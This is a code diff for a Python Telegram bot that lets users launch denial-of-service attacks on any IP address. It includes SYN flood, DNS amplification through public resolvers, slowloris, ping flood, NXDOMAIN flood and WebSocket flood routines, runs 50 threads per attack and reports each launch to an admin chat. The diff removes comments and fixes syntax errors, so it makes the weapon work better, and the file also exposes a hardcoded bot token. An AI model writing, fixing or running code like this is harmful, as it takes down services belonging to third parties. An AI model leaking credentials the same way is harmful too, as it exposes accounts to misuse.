@@ -11,10 +11,10 @@ from telebot import types
 
 TOKEN = "8994968874:AAHGgpCF-8gn1u-Kv7BBGvBjEl8EuYCKKZE"
 ADMIN_CHAT_ID = 8841848847
-MAX_PACKETS = 1000000  # Industrial-grade flood volume
+MAX_PACKETS = 1000000
 
 bot = telebot.TeleBot(TOKEN)
-user_attacks = {}  # {chat_id: {'method': '', 'target': ''}}
+user_attacks = {}
 
 # ===== CYBER WEAPONRY ARSENAL =====
 ATTACK_METHODS = {
@@ -28,7 +28,6 @@ ATTACK_METHODS = {
 
 # ----- RAW PACKET GENERATORS -----
 def syn_flood(target_ip, target_port):
-    """TCP SYN Flood using raw socket manipulation"""
     ip = IP(dst=target_ip)
     tcp = TCP(sport=random.randint(1024,65535), dport=target_port, flags="S", 
              seq=random.randint(0,4294967295), window=64240)
@@ -40,21 +39,18 @@ def syn_flood(target_ip, target_port):
             print(f"SYN Flood Error: {str(e)}", file=sys.stderr)
 
 def udp_amplification(target, port=53):
-    """DNS Amplification attack vector"""
-    dns_servers = ['8.8.8.8', '1.1.1.1']  # Reflector list
-    payload = bytearray(random.getrandbits(8) for _ range(1024))
+    dns_servers = ['8.8.8.8', '1.1.1.1']
+    payload = bytearray(random.getrandbits(8) for _ in range(1024))
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             for dns_server in dns_servers:
                 sock.sendto(payload, (dns_server, port))
-                sock.sendto((target[0], port), (dns_server, port))  # Spoofed source
+                sock.sendto((target[0], port), (dns_server, port))
         except Exception as e:
             print(f"UDP Amp Error: {str(e)}", file=sys.stderr)
 
-# ----- AIOHTTP-BASED ATTACKS -----
 def slowloris(target):
-    """Slow HTTP Denial of DoS"""
     headers = [("User-Agent", "Mozilla/5.0"), ("Connection", "keep-alive")]
     while True:
         try:
@@ -106,8 +102,7 @@ def execute_attack(message):
         
         bot.send_message(chat_id, f"🚀 LAUNCHING {ATTACK_METHODS[method_id]} AT {ip}")
         
-        # Multi-threaded attack launch
-        for _ in range(50):  # 50 concurrent threads
+        for _ in range(50):
             threading.Thread(target=attack_switcher(method_id, ip)).start()
             
         bot.send_message(ADMIN_CHAT_ID, 
@@ -121,35 +116,30 @@ def execute_attack(message):
         print(f"Attack Error: {str(e)}", file=sys.stderr)
 
 def attack_switcher(method_id, target):
-    """Return appropriate attack function"""
     return {
         '1': lambda: syn_flood(target, random.randint(1,65535)),
         '2': lambda: udp_amplification(target),
         '3': lambda: slowloris(target),
-        '4': lambda: os.system(f"ping {target} -l 65500 -n 1000000 -w 1"),
+        '4': lambda: subprocess.run(["ping", target, "-l", "65500", "-n", "1000000", "-w", "1"], capture_output=True),
         '5': lambda: dns_nxdomain_attack(target),
         '6': lambda: websocket_apocalypse(target)
     }.get(method_id, lambda: None)
 
-# ----- ADDITIONAL WEAPNS -----  
 def dns_nxdomain_attack(target):
-    """DNS query flood with non-existent domains"""
     while True:
         random_sub = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12))
         query = f"{random_sub}.{target}"
         subprocess.run(["nslookup", query], stdout=subprocess.DEVNULL)
 
 def websocket_apocalypse(target):
-    """WebSocket connection flood"""
     from websocket import create_connection
     while True:
         try:
             ws = create_connection(f"ws://{target}/")
-            ws.send("0"*1024*1024)  # 1MB payload
+            ws.send("0"*1024*1024)
         except:
             pass
 
-# ----- UTILITIES -----
 def is_valid_ip(ip):
     try:
         socket.inet_aton(ip)
